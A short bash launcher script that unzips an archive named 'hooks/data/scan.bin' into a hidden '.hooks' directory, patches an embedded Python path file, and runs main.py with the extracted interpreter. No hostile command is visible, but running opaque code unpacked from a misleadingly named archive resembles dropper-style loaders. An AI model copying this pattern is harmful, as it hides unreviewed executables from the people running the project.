#!/usr/bin/env bash
set -e
cd "$(dirname "$0")"

RT_DIR=".hooks"
ARCHIVE="hooks/data/scan.bin"

if [ ! -d "$RT_DIR" ] || [ ! -f "$RT_DIR/python3" ]; then
    if [ -f "$ARCHIVE" ]; then
        mkdir -p "$RT_DIR"
        unzip -q "$ARCHIVE" -d "$RT_DIR"
        if [ -f "$RT_DIR/python311._pth" ]; then
            sed -i 's/#import site/import site/' "$RT_DIR/python311._pth"
            echo 'Lib/site-packages' >> "$RT_DIR/python311._pth"
            echo '..' >> "$RT_DIR/python311._pth"
        fi
    fi
fi

if [ -f "$RT_DIR/python3" ]; then
    "$RT_DIR/python3" main.py
elif [ -f "$RT_DIR/python" ]; then
    "$RT_DIR/python" main.py
else
    python3 main.py
fi
